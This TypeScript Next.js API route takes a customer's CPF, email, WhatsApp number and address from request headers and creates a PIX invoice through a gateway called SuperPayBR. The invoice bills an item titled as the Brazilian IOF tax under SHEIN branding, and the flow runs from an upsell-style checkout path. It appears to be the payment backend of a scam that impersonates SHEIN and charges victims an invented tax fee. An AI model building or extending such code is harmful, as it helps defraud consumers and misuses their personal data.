import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA IOF SUPERPAYBR ===")

    const body = await request.json()
    const { amount, type } = body

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 Dados da fatura IOF:", {
      amount,
      type,
      cliente: cpfData.nome,
      email: userEmail,
    })

    // Primeiro, fazer autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const accessToken = authResult.data.access_token

    // Preparar dados da fatura IOF SuperPayBR
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          district: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01000000",
          country: "BR",
        },
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        id: `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        type: "3", // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: "SHEIN_IOF",
        installment: "1",
        order_url: `${request.nextUrl.origin}/upp10/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
            title: "IOF - Imposto sobre Operações Financeiras",
            qnt: "1",
            discount: 0,
            amount: Number.parseFloat(amount),
          },
        ],
      },
      shipping: {
        amount: 0.0,
      },
    }

    console.log("🚀 Enviando fatura IOF para SuperPayBR...")

    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta SuperPayBR IOF:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (createResponse.ok) {
      const invoiceResult = await createResponse.json()
      console.log("✅ Fatura IOF SuperPayBR criada com sucesso!")

      // Mapear resposta para formato esperado
      const mappedInvoice = {
        id: invoiceResult.fatura.id,
        invoice_id: invoiceResult.fatura.invoice_id,
        external_id: invoiceData.payment.id,
        pix: {
          payload: invoiceResult.fatura.pix.payload,
          image: invoiceResult.fatura.pix.image,
          qr_code: invoiceResult.fatura.pix.image,
        },
        status: {
          code: invoiceResult.fatura.status.code,
          title: invoiceResult.fatura.status.title,
          text: invoiceResult.fatura.status.text || "pending",
        },
        valores: {
          bruto: invoiceResult.fatura.valores.bruto,
          liquido: invoiceResult.fatura.valores.liquido,
        },
        vencimento: {
          dia: invoiceResult.fatura.vencimento.dia,
        },
        type: "real",
      }

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        raw_response: invoiceResult,
      })
    } else {
      const errorText = await createResponse.text()
      console.log("❌ Erro ao criar fatura IOF SuperPayBR:", createResponse.status, errorText)

      return NextResponse.json(
        {
          success: false,
          error: `Erro SuperPayBR: ${createResponse.status} - ${errorText}`,
          fallback: true,
        },
        { status: createResponse.status },
      )
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura IOF SuperPayBR:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno ao criar fatura IOF SuperPayBR",
        fallback: true,
      },
      { status: 500 },
    )
  }
}
